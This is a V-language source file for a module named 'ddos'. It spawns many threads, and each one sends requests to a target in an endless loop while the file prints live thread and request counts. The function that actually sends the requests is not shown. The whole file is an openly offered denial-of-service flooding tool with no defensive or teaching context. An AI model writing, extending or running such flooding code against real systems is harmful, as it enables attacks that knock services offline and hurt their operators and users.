module ddos

import time { sleep }

fn dos(target string, req_count &int) {
	mut success := false

    for {
        success = ddos.request(target)
		if success {
			unsafe { *req_count += 1 }
		}
    }
}

fn show_info(threads int, requests int) {
	value_color := '\033[34m'
	reset := '\033[0m'
	print('\r       Threads: ${value_color}${threads}${reset} Requests: ${value_color}${requests}${reset}')
}

pub fn ddos(threads_num int, target string) {
	mut threads := []thread{}
	mut req_count := 0

    for i in 0..threads_num {
    	threads << spawn dos(target, &req_count)
		show_info(i+1, req_count)
    }

	for {
		show_info(threads_num, req_count)
		sleep(100 * time.millisecond)
	}
}
